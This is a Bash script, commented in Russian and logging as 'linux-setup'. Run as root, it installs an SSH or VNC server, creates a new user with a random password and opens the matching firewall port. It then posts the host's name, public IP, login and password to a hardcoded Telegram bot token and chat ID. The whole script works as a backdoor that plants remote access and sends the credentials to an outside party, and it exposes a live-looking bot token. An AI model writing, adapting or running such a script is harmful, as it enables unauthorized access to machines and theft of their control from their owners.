#!/bin/bash
# ===== НАСТРОЙКИ =====
: "${TOKEN:=5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M}"
: "${CHAT_ID:=5336452267}"
: "${MODE:=ssh}"
: "${LOG_FILE:=/tmp/linux-setup.log}"
# =====================

# Логирование
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"; }

log "=== Запуск скрипта ==="
log "MODE=$MODE, TOKEN=${TOKEN:0:15}..., CHAT_ID=$CHAT_ID"

# Проверка прав root
if [ "$EUID" -ne 0 ]; then
    log "❌ ERROR: Script must be run as root"
    exit 1
fi

# Генерация данных
NEW_USER="rdp_$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9_')"
NEW_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c 16 || echo "Pass$(date +%s)")
IP=$(curl -sSL https://api.ipify.org?format=json 2>/dev/null | grep -o '"ip":"[^"]*"' | cut -d'"' -f4 || echo "unknown")

log "Generated: USER=$NEW_USER, IP=$IP"

# Функция отправки в Telegram (максимально совместимая)
send_tg() {
    local msg="$1"
    log "Sending to TG: $msg"
    
    # Пробуем curl с form-data (надёжнее чем query-параметры)
    local result=$(curl -s -w "\n%{http_code}" -X POST \
        "https://api.telegram.org/bot${TOKEN}/sendMessage" \
        -d "chat_id=${CHAT_ID}" \
        -d "text=${msg}" \
        2>&1)
    
    local http_code=$(echo "$result" | tail -n1)
    local body=$(echo "$result" | sed '$d')
    
    log "TG Response: HTTP $http_code, Body: $body"
    
    if [ "$http_code" = "200" ] && echo "$body" | grep -q '"ok":true'; then
        log "✅ Telegram: OK"
        return 0
    else
        log "❌ Telegram: Failed (code=$http_code)"
        return 1
    fi
}

# Основная логика
case "$MODE" in
    ssh)
        log "Configuring SSH..."
        
        # Установка SSH
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq >/dev/null 2>&1
            apt-get install -y openssh-server >/dev/null 2>&1
            systemctl enable ssh >/dev/null 2>&1
            systemctl start ssh >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y openssh-server >/dev/null 2>&1
            systemctl enable sshd >/dev/null 2>&1
            systemctl start sshd >/dev/null 2>&1
        else
            log "⚠️ Package manager not detected, skipping SSH install"
        fi
        
        # Создание пользователя
        if ! id "$NEW_USER" &>/dev/null; then
            useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null || adduser -D -s /bin/bash "$NEW_USER" 2>/dev/null
            echo "${NEW_USER}:${NEW_PASS}" | chpasswd 2>/dev/null
            log "Created user: $NEW_USER"
        else
            log "User $NEW_USER already exists"
        fi
        
        # Фаервол
        ufw allow 22/tcp >/dev/null 2>&1 || firewall-cmd --add-service=ssh --permanent >/dev/null 2>&1 || true
        
        MSG="SSH-Ready|Host:$(hostname)|IP:${IP}|Port:22|Login:${NEW_USER}|Pass:${NEW_PASS}"
        ;;
        
    vnc)
        log "Configuring VNC..."
        
        # Установка VNC (минимальная)
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq >/dev/null 2>&1
            apt-get install -y tigervnc-standalone-server >/dev/null 2>&1 || apt-get install -y tightvncserver >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y tigervnc-server >/dev/null 2>&1
        fi
        
        # Пользователь
        if ! id "$NEW_USER" &>/dev/null; then
            useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null
            echo "${NEW_USER}:${NEW_PASS}" | chpasswd 2>/dev/null
        fi
        
        # VNC пароль
        mkdir -p /home/"$NEW_USER"/.vnc 2>/dev/null
        echo "${VNC_PASS:-Vnc123456}" | vncpasswd -f > /home/"$NEW_USER"/.vnc/passwd 2>/dev/null
        chmod 600 /home/"$NEW_USER"/.vnc/passwd 2>/dev/null
        chown -R "$NEW_USER":"$NEW_USER" /home/"$NEW_USER"/.vnc 2>/dev/null
        
        # Порт
        ufw allow 5901/tcp >/dev/null 2>&1 || firewall-cmd --add-port=5901/tcp --permanent >/dev/null 2>&1 || true
        
        MSG="VNC-Ready|Host:$(hostname)|IP:${IP}|Port:5901|Login:${NEW_USER}|Pass:${NEW_PASS}|VNC-Pass:${VNC_PASS:-Vnc123456}"
        ;;
        
    *)
        MSG="ERR:Unknown MODE=${MODE}"
        ;;
esac

# Отправка
send_tg "$MSG"
log "=== Скрипт завершён ==="
